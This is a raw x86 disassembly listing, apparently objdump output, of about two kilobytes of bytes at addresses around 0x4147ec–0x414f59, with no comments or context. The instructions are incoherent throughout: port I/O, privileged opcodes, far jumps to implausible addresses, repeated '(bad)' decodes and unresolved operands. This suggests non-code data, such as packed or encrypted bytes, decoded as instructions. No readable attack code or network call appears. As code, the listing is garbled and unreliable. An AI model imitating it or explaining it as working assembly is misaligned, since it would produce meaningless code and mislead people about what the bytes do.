  4147ec:	les    ebp,FWORD PTR [ebx]
  4147ee:	sub    ecx,edx
  4147f0:	out    0x6f,al
  4147f2:	out    dx,al
  4147f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147f4:	inc    edi
  4147f5:	sbb    eax,0xf7537d97
  4147fa:	dec    edi
  4147fb:	mov    eax,ds:0xd30135a
  414800:	cdq    
  414801:	add    al,0x6b
  414803:	xor    al,bh
  414805:	xor    DWORD PTR [esi],edx
  414807:	xchg   esi,eax
  414808:	jmp    0x41479d
  41480a:	push   edi
  41480b:	dec    ebp
  41480c:	mov    esp,0xee79ee34
  414811:	jle    0x414819
  414813:	xor    sp,WORD PTR [edx]
  414816:	inc    ebx
  414817:	mov    edi,0xa3af6a37
  41481c:	addr16 sbb dl,dh
  41481f:	fcomp  st(7)
  414821:	mov    es,WORD PTR [esi-0x23]
  414824:	loopne 0x414834
  414826:	out    dx,al
  414827:	or     ebp,DWORD PTR [edi+0x46]
  41482a:	lock out 0xdd,al
  41482d:	sahf   
  41482e:	js     0x4147d1
  414830:	mov    BYTE PTR [eax+0x578e7314],al
  414836:	mov    ebp,0xb63a5e0e
  41483b:	or     bl,BYTE PTR [edx+0x4a]
  41483e:	fadd   st,st(7)
  414840:	sub    DWORD PTR [edx-0x7b],ebx
  414843:	std    
  414844:	pop    ebp
  414845:	in     al,dx
  414846:	lock mov al,ds:0x7730b0a
  41484c:	pop    ebx
  41484d:	mov    DWORD PTR [edi+ebp*1],ebp
  414850:	bound  esp,QWORD PTR [edi]
  414852:	stc    
  414853:	mov    ebx,0x446138de
  414858:	sbb    esp,DWORD PTR [ecx+0x41]
  41485b:	jmp    FWORD PTR [edi-0x76d4d531]
  414861:	shr    esi,cl
  414863:	pop    ds
  414864:	out    dx,eax
  414865:	or     DWORD PTR [eax+0x7a],edx
  414868:	je     0x4148b7
  41486a:	fcmovb st,st(4)
  41486c:	pop    esp
  41486d:	xor    al,0x79
  41486f:	mov    eax,ds:0x9b475d73
  414874:	adc    eax,0x2ad0ee42
  414879:	sub    BYTE PTR [ebx],al
  41487b:	push   ss
  41487c:	xchg   edi,eax
  41487d:	out    dx,al
  41487e:	lahf   
  41487f:	mov    eax,ds:0x997b4a46
  414884:	push   es
  414885:	test   al,0x1e
  414887:	jae    0x4148e7
  414889:	scas   al,BYTE PTR es:[edi]
  41488a:	clc    
  41488b:	xchg   esp,esp
  41488d:	call   0x60f1c23e
  414892:	or     al,0x7e
  414894:	call   0xa70e72fc
  414899:	sbb    al,0xee
  41489b:	sbb    eax,DWORD PTR [edx-0x39]
  41489e:	addr16 es pop edx
  4148a1:	pop    ebx
  4148a2:	fwait
  4148a3:	mov    eax,ds:0x4876d280
  4148a8:	and    al,0x4c
  4148aa:	sub    al,0x7b
  4148ac:	push   edx
  4148ad:	stos   DWORD PTR es:[edi],eax
  4148ae:	sub    cl,cl
  4148b0:	fidivr WORD PTR [edi-0x2c]
  4148b3:	add    edi,esi
  4148b5:	int    0x3a
  4148b7:	lods   eax,DWORD PTR ds:[esi]
  4148b8:	inc    edx
  4148b9:	and    ch,0xa0
  4148bc:	jnp    0x4148f9
  4148be:	(bad)  
  4148bf:	xor    bl,BYTE PTR [eax+0x5e861712]
  4148c5:	popf   
  4148c6:	xor    ecx,ebx
  4148c8:	jge    0x414855
  4148ca:	jnp    0x4148ea
  4148cc:	cmp    al,0x61
  4148ce:	jb     0x414884
  4148d0:	data16 lods al,BYTE PTR ds:[esi]
  4148d2:	cmc    
  4148d3:	dec    ebx
  4148d4:	adc    al,BYTE PTR [ebp-0x5998ae12]
  4148da:	es xchg edi,eax
  4148dc:	mov    eax,ds:0x59b01416
  4148e1:	sub    esi,DWORD PTR [esi]
  4148e3:	jnp    0x414941
  4148e5:	jmp    0x414904
  4148e7:	in     eax,0x96
  4148e9:	imul   bh
  4148eb:	(bad)  
  4148ec:	in     eax,0xc7
  4148ee:	jmp    0x4148b0
  4148f0:	cwde   
  4148f1:	pop    eax
  4148f2:	mov    edi,0xa9439fd5
  4148f7:	int3   
  4148f8:	adc    al,0x61
  4148fa:	rol    BYTE PTR [edi],cl
  4148fc:	mov    ebx,0x5e1bd374
  414901:	add    BYTE PTR [edi-0x487398bb],bh
  414907:	mov    eax,0x8cfc4384
  41490c:	gs popa 
  41490e:	mov    bl,0x1
  414910:	bound  esi,QWORD PTR [edi+edx*4+0x203c5e58]
  414917:	fidivr DWORD PTR ds:0xd9dd1ec4
  41491d:	pusha  
  41491e:	iret   
  41491f:	xor    DWORD PTR [ebp+0x1ca3d55],esp
  414925:	lods   eax,DWORD PTR ds:[esi]
  414926:	out    dx,al
  414927:	bound  esp,QWORD PTR [ebx+0x24]
  41492a:	sbb    edx,DWORD PTR [edi]
  41492c:	mov    ?,WORD PTR [eax]
  41492e:	mov    bl,0x9e
  414930:	cmp    ebp,DWORD PTR [eax-0x26a10159]
  414936:	push   ds
  414937:	retf   0x4e7f
  41493a:	out    dx,al
  41493b:	mov    ds:0x96709df8,eax
  414940:	imul   edi,DWORD PTR [eax+0x4944a15c],0xffffffa0
  414947:	pop    edx
  414948:	inc    ebp
  414949:	add    al,0x13
  41494b:	inc    eax
  41494c:	pop    ebx
  41494d:	and    BYTE PTR [ebp+0x7a],ch
  414950:	(bad)  [esi-0x2b661542]
  414956:	dec    eax
  414957:	mov    eax,ds:0x57638263
  41495c:	push   ds
  41495d:	adc    BYTE PTR [esi+0x65],bh
  414960:	pop    edi
  414961:	(bad)  
  414962:	in     eax,dx
  414963:	xor    edx,DWORD PTR [edx+0x7e387fa6]
  414969:	adc    BYTE PTR [ebx],bh
  41496b:	push   edx
  41496c:	arpl   WORD PTR [edx+0xe],bx
  41496f:	add    dl,dl
  414971:	xor    eax,0x4fd44154
  414976:	xor    al,0xfa
  414978:	xor    ecx,edi
  41497a:	pop    ecx
  41497b:	and    DWORD PTR [ecx-0x55d01e9d],eax
  414981:	mov    cl,0xe5
  414983:	ins    BYTE PTR es:[edi],dx
  414984:	loopne 0x4149ca
  414986:	mov    ebx,0xea11b9c
  41498b:	or     al,0x80
  41498d:	test   DWORD PTR [ebx],ebp
  41498f:	pop    ebx
  414990:	push   ecx
  414991:	xchg   ebp,eax
  414992:	aam    0x85
  414994:	sahf   
  414995:	int    0xc
  414997:	stos   BYTE PTR es:[edi],al
  414998:	cmp    eax,0xafab2ed6
  41499d:	pop    edi
  41499e:	ins    DWORD PTR es:[edi],dx
  41499f:	retf   
  4149a0:	or     eax,0xdb271edf
  4149a5:	and    BYTE PTR [ebx],dh
  4149a7:	mov    ebp,0xe3dc210a
  4149ac:	scas   al,BYTE PTR es:[edi]
  4149ad:	inc    ebp
  4149ae:	lock mov ch,0xe4
  4149b1:	xchg   ecx,eax
  4149b2:	shl    al,1
  4149b4:	xchg   BYTE PTR [ebp-0x1f],ch
  4149b7:	popf   
  4149b8:	or     esp,DWORD PTR [ecx+0x2a]
  4149bb:	and    DWORD PTR [edx],0x3b22e5cb
  4149c1:	pushf  
  4149c2:	dec    DWORD PTR [ecx-0x9]
  4149c5:	cmp    ah,bh
  4149c7:	push   edx
  4149c8:	repnz test ebp,ecx
  4149cb:	mov    esi,0x255ef49c
  4149d0:	sbb    eax,0x4fbd0f61
  4149d5:	aaa    
  4149d6:	popa   
  4149d7:	xchg   esi,edx
  4149d9:	push   ecx
  4149da:	out    dx,al
  4149db:	lock xor BYTE PTR [esi+0x850fe0b],0x43
  4149e3:	outs   dx,DWORD PTR ds:[esi]
  4149e4:	jle    0x414a46
  4149e6:	sahf   
  4149e7:	sub    eax,DWORD PTR [ebx+0x5a5c2f7f]
  4149ed:	mov    ds:0x818e4eee,al
  4149f2:	lahf   
  4149f3:	sbb    al,0xbc
  4149f5:	push   0x27
  4149f7:	mov    eax,ds:0xf08f93b
  4149fc:	into   
  4149fd:	and    al,0x48
  4149ff:	out    dx,eax
  414a00:	pop    esi
  414a01:	push   eax
  414a02:	enter  0xccf2,0x73
  414a06:	push   esi
  414a07:	pop    edi
  414a08:	sbb    eax,0x5ef3e667
  414a0d:	sar    BYTE PTR [ebx+0x56],1
  414a10:	inc    esi
  414a11:	push   cs
  414a12:	into   
  414a13:	cdq    
  414a14:	out    dx,al
  414a15:	and    bl,ch
  414a17:	pusha  
  414a18:	or     BYTE PTR [ebx-0x77426821],bl
  414a1e:	mov    DWORD PTR [edx-0x53],0xb600245d
  414a25:	xlat   BYTE PTR ds:[ebx]
  414a26:	call   0xbab1e91e
  414a2b:	mov    ch,0x64
  414a2d:	dec    esi
  414a2e:	shr    DWORD PTR ds:0x1fd8c125,0x9e
  414a35:	js     0x414a39
  414a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a38:	loope  0x414aa6
  414a3a:	mov    bl,al
  414a3c:	pusha  
  414a3d:	ficomp DWORD PTR [ecx+eiz*4-0x27d24358]
  414a44:	dec    ebx
  414a45:	mov    ebp,DWORD PTR [ebp+0x21]
  414a48:	pop    esi
  414a49:	push   edx
  414a4a:	scas   eax,DWORD PTR es:[edi]
  414a4b:	mov    ecx,DWORD PTR [edx]
  414a4d:	stos   BYTE PTR es:[edi],al
  414a4e:	inc    ebp
  414a4f:	(bad)  
  414a50:	jbe    0x414a87
  414a52:	or     DWORD PTR [edi+0x29],ebx
  414a55:	das    
  414a56:	scas   eax,DWORD PTR es:[edi]
  414a57:	xor    eax,0xdd7a2d7e
  414a5c:	(bad)  
  414a5d:	dec    ebx
  414a5e:	out    dx,al
  414a5f:	outs   dx,BYTE PTR ds:[esi]
  414a60:	(bad)  
  414a61:	shl    DWORD PTR [eax+0x6176ccc3],cl
  414a67:	mov    eax,ds:0x8048a4b6
  414a6c:	sub    bl,BYTE PTR [ecx-0x6]
  414a6f:	imul   ebx,DWORD PTR [esi+0x72],0xffffffdb
  414a73:	in     eax,dx
  414a74:	into   
  414a75:	jmp    0xc5ba:0x4a959b69
  414a7c:	iret   
  414a7d:	pusha  
  414a7e:	dec    esi
  414a7f:	das    
  414a80:	test   BYTE PTR [esi+ecx*1],ch
  414a83:	inc    esi
  414a84:	pop    esi
  414a85:	fdivrp st(5),st
  414a87:	pop    edi
  414a88:	add    BYTE PTR [edx-0x30],dl
  414a8b:	out    0x94,al
  414a8d:	pusha  
  414a8e:	mov    eax,ss
  414a90:	rol    DWORD PTR [ebx],cl
  414a92:	jbe    0x414a20
  414a94:	into   
  414a95:	jmp    0x179fa174
  414a9a:	jmp    FWORD PTR [esp+eax*4]
  414a9d:	rcl    DWORD PTR [ecx+ecx*1+0x24],cl
  414aa1:	inc    ebp
  414aa2:	cs adc eax,0x81fe209a
  414aa8:	sar    BYTE PTR [ecx+0x4a],0xcf
  414aac:	pop    esi
  414aad:	out    dx,al
  414aae:	add    eax,0x67a73949
  414ab3:	inc    ebp
  414ab4:	ins    BYTE PTR es:[edi],dx
  414ab5:	pusha  
  414ab6:	pop    ss
  414ab7:	out    0x2d,eax
  414ab9:	push   ds
  414aba:	mov    WORD PTR [ebp-0x29],ss
  414abd:	shr    dh,1
  414abf:	ror    al,1
  414ac1:	adc    DWORD PTR [ecx-0x37],ebp
  414ac4:	loop   0x414a4a
  414ac6:	mov    ds:0x9aa5869a,eax
  414acb:	xchg   edx,eax
  414acc:	pop    edi
  414acd:	daa    
  414ace:	sbb    ah,bl
  414ad0:	xchg   BYTE PTR [ecx],ch
  414ad2:	dec    ebp
  414ad3:	sbb    dh,ah
  414ad5:	push   ebx
  414ad6:	lock pop ebp
  414ad8:	jle    0x414b57
  414ada:	cdq    
  414adb:	mov    eax,ds:0xea7aa949
  414ae0:	fwait
  414ae1:	pusha  
  414ae2:	and    DWORD PTR [ebx],0xffffff87
  414ae5:	mov    edi,0x797881d
  414aea:	in     al,0xe7
  414aec:	js     0x414b25
  414aee:	out    dx,al
  414aef:	stos   DWORD PTR es:[edi],eax
  414af0:	shr    BYTE PTR ds:0xf2574693,cl
  414af6:	in     al,0xa0
  414af8:	push   ecx
  414af9:	mov    ah,0x18
  414afb:	xor    al,0x5a
  414afd:	pop    edi
  414afe:	sbb    eax,0x6af56091
  414b03:	jmp    0xe67c:0x810090a6
  414b0a:	inc    edx
  414b0b:	mov    eax,ds:0xb0c776bb
  414b10:	(bad)  
  414b11:	data16 loop 0x414aed
  414b14:	pop    esi
  414b15:	mov    ebx,0x933f24f1
  414b1a:	fbld   TBYTE PTR [edi]
  414b1c:	pop    edi
  414b1d:	popa   
  414b1e:	and    edx,DWORD PTR [esi]
  414b20:	scas   eax,DWORD PTR es:[edi]
  414b21:	mov    ds:0xc943c2c0,al
  414b26:	out    dx,al
  414b27:	mov    WORD PTR [edx+0x54],es
  414b2a:	je     0x414b0b
  414b2c:	cmp    dh,dl
  414b2e:	add    DWORD PTR [eax+ebp*1+0x5f27e704],ebx
  414b35:	mov    bl,0x56
  414b37:	loope  0x414aef
  414b39:	adc    DWORD PTR [edx-0x419ca105],edx
  414b3f:	iret   
  414b40:	push   es
  414b41:	fwait
  414b42:	add    bh,0x7
  414b45:	mov    ebp,0xea7ca896
  414b4a:	int    0x83
  414b4c:	arpl   WORD PTR [eax-0x5805f3fb],dx
  414b52:	sub    BYTE PTR [ecx],al
  414b54:	dec    esp
  414b55:	xchg   edi,eax
  414b56:	out    dx,al
  414b57:	jg     0x414b44
  414b59:	test   DWORD PTR [ebx-0x8133a0],ebp
  414b5f:	mov    al,ds:0x942999ed
  414b64:	sbb    eax,0x5e7c4d18
  414b69:	pop    es
  414b6a:	outs   dx,DWORD PTR ds:[esi]
  414b6b:	mov    al,BYTE PTR [esi-0x184f1454]
  414b71:	push   ecx
  414b72:	ror    DWORD PTR [eax-0x6b836390],cl
  414b78:	(bad)  
  414b79:	pusha  
  414b7a:	inc    esi
  414b7b:	fcom   DWORD PTR [eax]
  414b7d:	inc    esi
  414b7e:	mov    BYTE PTR [eax+0x6a1dbb5e],bl
  414b84:	pusha  
  414b85:	shl    al,1
  414b87:	stos   BYTE PTR es:[edi],al
  414b88:	cwde   
  414b89:	pusha  
  414b8a:	mov    ds:0xb7fd84ad,eax
  414b8f:	push   ecx
  414b90:	mov    dh,0x37
  414b92:	out    dx,al
  414b93:	fdiv   DWORD PTR [edx-0x2a8ebf91]
  414b99:	cmp    BYTE PTR [esi-0x5f],cl
  414b9c:	das    
  414b9d:	dec    ecx
  414b9e:	retf   0x973b
  414ba1:	sub    DWORD PTR [ecx+esi*8+0x5e],esi
  414ba5:	jbe    0x414b53
  414ba7:	iret   
  414ba8:	fisttp QWORD PTR [ecx+0x61072e2e]
  414bae:	(bad)  
  414baf:	push   0x8548fb42
  414bb4:	mov    ds:0x4c23227c,eax
  414bb9:	es out dx,al
  414bbb:	gs jecxz 0x414c0f
  414bbe:	in     al,0x75
  414bc0:	adc    dl,bl
  414bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bc3:	nop
  414bc4:	ret    
  414bc5:	enter  0x4d9b,0xc6
  414bc9:	pusha  
  414bca:	fnsave [eax+0x7aacd23c]
  414bd0:	dec    edi
  414bd1:	test   DWORD PTR [ecx],0xcbb5e75
  414bd7:	jns    0x414b63
  414bd9:	mov    BYTE PTR [eax-0x5f],cl
  414bdc:	inc    ebx
  414bdd:	in     al,dx
  414bde:	xchg   esi,eax
  414bdf:	sub    eax,0x1ae2dfda
  414be4:	pop    esi
  414be5:	lock ss jg 0x414be7
  414be9:	adc    dl,BYTE PTR [esi-0x4f]
  414bec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bed:	pusha  
  414bee:	pusha  
  414bef:	bound  ebp,QWORD PTR [ebp-0x64]
  414bf2:	stos   BYTE PTR es:[edi],al
  414bf3:	ins    DWORD PTR es:[edi],dx
  414bf4:	pop    esp
  414bf5:	loope  0x414be2
  414bf7:	sti    
  414bf8:	pop    ebp
  414bf9:	dec    eax
  414bfa:	or     eax,0xbc9e2715
  414bff:	inc    eax
  414c00:	sbb    al,0xed
  414c02:	mov    dh,0xa0
  414c04:	pop    ds
  414c05:	pop    ebp
  414c06:	adc    eax,0xdffaa994
  414c0b:	loope  0x414c60
  414c0d:	icebp  
  414c0e:	cli    
  414c0f:	in     eax,dx
  414c10:	jno    0x414c6e
  414c12:	or     DWORD PTR [eax+0x79],ebp
  414c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c16:	outs   dx,BYTE PTR ds:[esi]
  414c17:	mov    cl,0x3d
  414c19:	add    BYTE PTR [ebp+0x6d8d5cae],al
  414c1f:	adc    ch,dl
  414c21:	loope  0x414c2a
  414c23:	pusha  
  414c24:	lock mov ah,0x69
  414c27:	or     BYTE PTR [esi-0x1a],bl
  414c2a:	jmp    0xaac5:0x63ebdeeb
  414c31:	pusha  
  414c32:	iret   
  414c33:	out    0x67,eax
  414c35:	pop    es
  414c36:	lods   al,BYTE PTR ds:[esi]
  414c37:	test   eax,0xb9208df8
  414c3c:	ins    DWORD PTR es:[edi],dx
  414c3d:	pusha  
  414c3e:	das    
  414c3f:	mov    ah,0x8e
  414c41:	cmp    DWORD PTR [edi+0x47],edi
  414c44:	push   ecx
  414c45:	popa   
  414c46:	aas    
  414c47:	push   edx
  414c48:	jp     0x414c13
  414c4a:	ins    DWORD PTR es:[edi],dx
  414c4b:	les    ecx,FWORD PTR [edi]
  414c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c4e:	out    dx,al
  414c4f:	jle    0x414c44
  414c51:	aas    
  414c52:	scas   al,BYTE PTR es:[edi]
  414c53:	pop    esi
  414c54:	les    esi,FWORD PTR [eax-0x56]
  414c57:	mov    al,ds:0x85a03870
  414c5c:	push   ebx
  414c5d:	jg     0x414c4e
  414c5f:	les    esp,FWORD PTR [edx+ebp*2-0x73]
  414c63:	call   DWORD PTR [ecx]
  414c65:	ficom  WORD PTR ds:0xccb95b64
  414c6b:	jecxz  0x414c76
  414c6d:	inc    ebp
  414c6e:	jmp    0xb362b280
  414c73:	cld    
  414c74:	(bad)  
  414c75:	jbe    0x414bff
  414c77:	sbb    dh,BYTE PTR ds:0xa1217887
  414c7d:	mov    esi,0xd35f32d1
  414c82:	jnp    0x414c25
  414c84:	test   al,0xfd
  414c86:	or     bh,bh
  414c88:	mov    al,ds:0x5e41cc58
  414c8d:	ret    
  414c8e:	push   ebp
  414c8f:	jne    0x414c4d
  414c91:	cld    
  414c92:	addr16 mov esp,0x5cbc6143
  414c98:	xlat   BYTE PTR ds:[ebx]
  414c99:	jo     0x414d18
  414c9b:	dec    edx
  414c9c:	mov    al,ds:0x7df212a5
  414ca1:	xchg   esi,eax
  414ca2:	out    dx,al
  414ca3:	inc    ebx
  414ca4:	fwait
  414ca5:	and    ch,BYTE PTR [eax]
  414ca7:	lods   al,BYTE PTR ds:[esi]
  414ca8:	jb     0x414cfb
  414caa:	(bad)  
  414cab:	fiadd  WORD PTR [esi-0x5756f1b1]
  414cb1:	dec    esi
  414cb2:	fdivr  QWORD PTR [ebx]
  414cb4:	in     eax,dx
  414cb5:	adc    DWORD PTR [edi],0x7f
  414cb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cb9:	pop    esi
  414cba:	sahf   
  414cbb:	cmp    BYTE PTR [eax],0x38
  414cbe:	loope  0x414c60
  414cc0:	mov    ecx,0x6ac2303f
  414cc5:	pop    eax
  414cc6:	(bad)  
  414cc7:	xchg   ebx,eax
  414cc8:	pop    ebx
  414cc9:	jg     0x414cf5
  414ccb:	lea    esp,[esi-0x20c2f1da]
  414cd1:	pop    edi
  414cd2:	clc    
  414cd3:	xchg   BYTE PTR [ebx+0x61],dl
  414cd6:	test   eax,0x759446ab
  414cdb:	add    al,0x41
  414cdd:	(bad)  
  414cde:	out    dx,al
  414cdf:	xchg   DWORD PTR [eax+0x4e],edx
  414ce2:	cmp    BYTE PTR [ebp-0x5edb0968],0x53
  414ce9:	inc    esp
  414cea:	mov    eax,ds:0x704f891
  414cef:	out    0x5e,al
  414cf1:	cmp    ah,bh
  414cf3:	sbb    al,al
  414cf5:	lock inc edx
  414cf7:	dec    esi
  414cf8:	mov    eax,0x68a29ca0
  414cfd:	and    eax,0x3c5e5c92
  414d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d03:	dec    ecx
  414d04:	inc    edx
  414d05:	add    dh,BYTE PTR [eax]
  414d07:	and    al,0x4d
  414d09:	popa   
  414d0a:	and    DWORD PTR ds:0xa2758b2e,ebx
  414d10:	dec    eax
  414d11:	jb     0x414d01
  414d13:	cmp    BYTE PTR [eax],ch
  414d15:	(bad)  
  414d16:	fucomi st,st(3)
  414d18:	fprem1 
  414d1a:	fwait
  414d1b:	lahf   
  414d1c:	add    ch,BYTE PTR [esi+ebx*8-0x75]
  414d20:	push   ds
  414d21:	push   ebx
  414d22:	cmp    DWORD PTR [edx],edx
  414d24:	mov    ebx,0x1b2eee3b
  414d29:	and    ecx,edi
  414d2b:	push   esp
  414d2c:	dec    edx
  414d2d:	pop    eax
  414d2e:	fsub   QWORD PTR [eax-0x2ab77020]
  414d34:	cmp    eax,0x7666b0ea
  414d39:	add    bl,al
  414d3b:	adc    ebp,ebp
  414d3d:	sub    dh,ch
  414d3f:	lods   al,BYTE PTR ds:[esi]
  414d40:	mov    al,ds:0x5980b9fc
  414d45:	and    dh,BYTE PTR [edi-0x26d2760]
  414d4b:	jns    0x414da5
  414d4d:	daa    
  414d4e:	jg     0x414dc9
  414d50:	and    ah,BYTE PTR [ebp+0x145defff]
  414d56:	push   ecx
  414d57:	and    BYTE PTR [eax-0x75b785d6],0x29
  414d5e:	stos   BYTE PTR es:[edi],al
  414d5f:	mov    al,ds:0xadcbe808
  414d64:	mov    BYTE PTR [ecx+0x535fea50],ah
  414d6a:	pop    ebx
  414d6b:	or     eax,0x63baa333
  414d70:	adc    edx,DWORD PTR [edx-0x1689d752]
  414d76:	mul    DWORD PTR [edi+0x114ddca]
  414d7c:	cmp    al,0xe1
  414d7e:	jecxz  0x414dd6
  414d80:	(bad)  
  414d81:	mov    ebx,0x3da45fee
  414d86:	add    cl,ch
  414d88:	popf   
  414d89:	mov    eax,0x60ee7f5d
  414d8e:	xchg   edx,eax
  414d8f:	cmp    al,0x84
  414d91:	in     al,0x5a
  414d93:	mul    DWORD PTR [eax-0x488f11dd]
  414d99:	jle    0x414d5e
  414d9b:	and    DWORD PTR [ebp-0x7c],eax
  414d9e:	pusha  
  414d9f:	mov    al,ds:0x851e9951
  414da4:	push   ds
  414da5:	xchg   DWORD PTR [ebp-0x11e0b243],esi
  414dab:	cmp    al,0x75
  414dad:	pop    esp
  414dae:	fcmovnb st,st(7)
  414db0:	adc    eax,0xa79f597e
  414db5:	outs   dx,BYTE PTR ds:[esi]
  414db6:	imul   esp,DWORD PTR [esi+ebx*1-0x33],0x20
  414dbb:	add    bh,BYTE PTR [edx]
  414dbd:	(bad)  
  414dbe:	out    dx,al
  414dbf:	fistp  DWORD PTR ds:0xcbd425e
  414dc5:	sub    ch,ah
  414dc7:	mov    fs,edi
  414dc9:	and    edx,esi
  414dcb:	sahf   
  414dcc:	(bad)  
  414dcd:	ficomp DWORD PTR [eax+0x40]
  414dd0:	pop    esi
  414dd1:	sbb    BYTE PTR [eax-0x3b],ah
  414dd4:	adc    DWORD PTR [esi-0x2d7e5ec8],ebp
  414dda:	aam    0xbd
  414ddc:	add    esi,DWORD PTR [eax]
  414dde:	lds    edx,FWORD PTR [edx+0x5e]
  414de1:	ss jmp 0xba06ae16
  414de7:	js     0x414e46
  414de9:	sub    al,0x3a
  414deb:	mov    eax,ds:0x1229e584
  414df0:	(bad)  
  414df1:	popf   
  414df2:	jbe    0x414db6
  414df4:	pop    esi
  414df5:	cld    
  414df6:	loop   0x414e0a
  414df8:	popf   
  414df9:	mov    DWORD PTR [ebp+0x15],ebp
  414dfc:	push   esp
  414dfd:	popa   
  414dfe:	iret   
  414dff:	sti    
  414e00:	ja     0x414e2e
  414e02:	pop    esi
  414e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e04:	pop    ecx
  414e05:	or     eax,0xece486ee
  414e0a:	outs   dx,DWORD PTR ds:[esi]
  414e0b:	push   DWORD PTR [edi]
  414e0d:	jb     0x414dc1
  414e0f:	mov    al,ds:0x53fa7ad0
  414e14:	dec    esi
  414e15:	xchg   BYTE PTR [ebp+0x10abf24e],bh
  414e1b:	dec    ebx
  414e1c:	inc    eax
  414e1d:	(bad)
  414e20:	mov    cl,0x61
  414e22:	stos   DWORD PTR es:[edi],eax
  414e23:	push   cs
  414e24:	(bad)  
  414e25:	mov    dl,0x6c
  414e27:	mov    eax,ds:0x51585f64
  414e2c:	cwde   
  414e2d:	push   ebx
  414e2e:	fld    TBYTE PTR [ebx]
  414e30:	pusha  
  414e31:	fldcw  WORD PTR [ebp+0x7cf12a7a]
  414e37:	add    DWORD PTR [ecx],edx
  414e39:	xchg   esp,eax
  414e3a:	push   0xaab08aa1
  414e3f:	out    0x6b,al
  414e41:	imul   eax,esp,0xf32d5e0d
  414e47:	(bad)  
  414e48:	into   
  414e49:	ss fcmovnu st,st(1)
  414e4c:	add    BYTE PTR [ecx-0x6b],ah
  414e4f:	xchg   edi,eax
  414e50:	sbb    cl,BYTE PTR [ecx-0x59]
  414e53:	pop    eax
  414e54:	sbb    BYTE PTR [esi+0x1],ah
  414e57:	mov    ah,0xa
  414e59:	lea    ebp,[esi]
  414e5b:	jno    0x414e40
  414e5d:	das    
  414e5e:	push   0xfa6136ca
  414e63:	fwait
  414e64:	xor    eax,0x65073f7e
  414e69:	push   cs
  414e6a:	out    dx,al
  414e6b:	pop    ebx
  414e6c:	add    ah,bl
  414e6e:	(bad)  
  414e6f:	mov    ?,WORD PTR [eax]
  414e71:	mov    ebp,0x6281112e
  414e76:	xor    al,0x16
  414e78:	mov    ds:0x568bee2c,al
  414e7d:	inc    ecx
  414e7e:	outs   dx,BYTE PTR ds:[esi]
  414e7f:	cmc    
  414e80:	imul   DWORD PTR [eax-0x12]
  414e83:	and    bl,BYTE PTR [ecx+0x3ad36b09]
  414e89:	adc    BYTE PTR [edi-0x5f],bl
  414e8c:	(bad)  
  414e8d:	sub    eax,0xa95138f8
  414e92:	jae    0x414ee8
  414e94:	pop    esi
  414e95:	cmp    BYTE PTR [eax],0x92
  414e98:	cs loop 0x414ecf
  414e9b:	(bad)  
  414e9d:	pop    ebp
  414e9e:	repnz inc ebx
  414ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ea1:	sub    al,0x6c
  414ea3:	fidiv  WORD PTR [ebx+0x50]
  414ea6:	jmp    0xeef05c15
  414eab:	cmp    DWORD PTR [eax+0x659c0a3c],edi
  414eb1:	xchg   ebx,eax
  414eb2:	adc    ah,BYTE PTR [ecx+0x3ddea035]
  414eb8:	fdiv   DWORD PTR ds:0xd826681e
  414ebe:	and    esi,esi
  414ec0:	pop    ecx
  414ec1:	lock cld 
  414ec3:	mov    ch,0x65
  414ec5:	mov    bl,BYTE PTR [edi+0x62]
  414ec8:	loopne 0x414e83
  414eca:	pushf  
  414ecb:	dec    ecx
  414ecc:	push   0xffffff8f
  414ece:	jmp    0x414ebf
  414ed0:	(bad)  
  414ed1:	adc    eax,0x6071d9eb
  414ed6:	add    bl,dl
  414ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ed9:	loope  0x414e6a
  414edb:	push   esi
  414edc:	popa   
  414edd:	jmp    0x29b9:0xd0641fee
  414ee4:	push   esp
  414ee5:	mov    al,ds:0x4584a0c2
  414eea:	js     0x414ecd
  414eec:	clc    
  414eed:	pop    ecx
  414eee:	jmp    0x414ed3
  414ef0:	pop    esi
  414ef1:	div    BYTE PTR [edx]
  414ef3:	dec    esp
  414ef4:	loope  0x414f21
  414ef6:	loopne 0x414eb7
  414ef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ef9:	pusha  
  414efa:	(bad)  
  414efb:	adc    al,0x94
  414efd:	xor    DWORD PTR [esi-0x5],ebx
  414f00:	mov    cl,0xe2
  414f02:	out    0x68,eax
  414f04:	into   
  414f05:	stos   BYTE PTR es:[edi],al
  414f06:	pop    es
  414f07:	cmp    eax,0x616e06b0
  414f0c:	out    0xb6,eax
  414f0e:	pushf  
  414f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f10:	inc    ebp
  414f11:	pop    esi
  414f12:	sti    
  414f13:	pop    ebp
  414f14:	push   esi
  414f15:	ucomiss xmm5,xmm6
  414f18:	jecxz  0x414ece
  414f1a:	out    0x30,eax
  414f1c:	adc    ecx,esp
  414f1e:	and    ch,BYTE PTR [ebx+0x1e]
  414f21:	mov    ecx,ebp
  414f23:	jbe    0x414ef1
  414f25:	pop    edi
  414f26:	iret   
  414f27:	mov    BYTE PTR [edi],bh
  414f29:	mov    edi,0x4035b901
  414f2e:	adc    eax,0xeddfc44d
  414f33:	jo     0x414ee1
  414f35:	xchg   edi,eax
  414f36:	adc    BYTE PTR [ecx-0x4fa96b98],bl
  414f3c:	push   ebx
  414f3d:	popa   
  414f3e:	test   al,0x35
  414f40:	call   DWORD PTR [esi]
  414f42:	xchg   ecx,eax
  414f43:	push   edi
  414f44:	fs pop edx
  414f46:	out    dx,al
  414f47:	mul    BYTE PTR [ecx-0x60]
  414f4a:	leave  
  414f4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f4c:	and    cl,BYTE PTR [edi-0x42]
  414f4f:	lahf   
  414f50:	inc    ebx
  414f51:	push   edi
  414f52:	lahf   
  414f53:	adc    al,0xfe
  414f55:	leave  
  414f56:	(bad)  
  414f57:	jp     0x414f1c
  414f59:	repz out dx,al
